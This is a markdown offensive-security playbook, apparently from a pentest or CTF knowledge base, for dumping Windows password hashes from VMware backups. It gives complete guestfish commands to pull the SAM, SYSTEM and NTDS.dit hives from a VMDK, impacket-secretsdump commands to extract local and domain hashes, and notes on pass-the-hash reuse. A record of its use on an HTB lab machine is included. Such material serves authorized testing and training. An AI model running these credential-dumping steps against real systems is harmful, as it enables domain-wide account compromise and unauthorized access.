# SAM/SYSTEM Extraction from VMware Backups

## When to use

- Access to VMware backup files (.vmdk, .vmx, snapshots)
- Backups are stored on a share or location you can read
- The backed-up VM is a Windows machine (domain controller, server, workstation)
- Goal: extract local account password hashes (SAM) or AD database (NTDS.dit)

## Tags

- ATT&CK: T1003.002 (OS Credential Dumping: SAM), T1005 (Data from Local System)
- Platform: Linux (for extraction tools), Windows (target VM)
- Services: VMware vSphere/ESXi, backup shares
- Privileges: read access to backup storage

## How it works

VMware VM disk images (.vmdk) contain the full filesystem of the backed-up machine.
Using `guestfish` (from libguestfs), you can mount the VMDK read-only and extract
the SAM and SYSTEM registry hives. These hives contain local account password hashes
that can be cracked offline or used for pass-the-hash.

## Extraction with guestfish

```bash
# Set backend (required in containers/minimal environments)
export LIBGUESTFS_BACKEND=direct

# Launch guestfish on the VMDK
guestfish --ro -a disk.vmdk

# Inside guestfish:
> run
> list-filesystems
# Find the Windows partition (usually /dev/sda2 or /dev/sda1)
> mount /dev/sda2 /
> download /Windows/System32/config/SAM /tmp/SAM
> download /Windows/System32/config/SYSTEM /tmp/SYSTEM
# For domain controllers, also grab NTDS:
> download /Windows/NTDS/ntds.dit /tmp/ntds.dit
> exit
```

## Dumping hashes

```bash
# Local accounts (SAM + SYSTEM)
impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL

# Domain accounts (NTDS + SYSTEM)
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL
```

## Operational notes

**VMDK not VHDX.** VMware uses .vmdk format. Hyper-V uses .vhdx. Tools differ:
guestfish handles both, but `mount-vhd` (PowerShell) only handles VHDX. Don't
assume the format from writeups; check the actual file extension.

**Snapshot chains.** VMware snapshots create delta VMDKs. You may need the base
disk plus all delta files. guestfish handles this if all files are present.

**LIBGUESTFS_BACKEND=direct.** Required when running in containers or environments
without libvirt. Without it, guestfish tries to use libvirt and fails.

**Backup age matters.** The hashes are from when the backup was taken. If passwords
were changed after the backup, the extracted hashes won't work for live authentication.
However, if the Administrator password hasn't changed since the backup, the hash is
still valid.

**Previous domain controller backups.** If the backed-up VM was a DC, NTDS.dit
contains all domain account hashes. This is a domain-wide compromise from a single
backup file.

## Alternative: 7z extraction

If guestfish isn't available, some VMDK formats can be extracted with 7-Zip:

```bash
7z x disk.vmdk
# Navigate to Windows/System32/config/ in the extracted filesystem
```

This works for monolithic VMDKs but not split or sparse formats.

## Proven on

- Windows Server 2019 VMDK from VMBackups share (HTB Checkpoint, 2026-08-29): guestfish extracted SAM/SYSTEM, secretsdump recovered Administrator hash, used for PtH via wmiexec
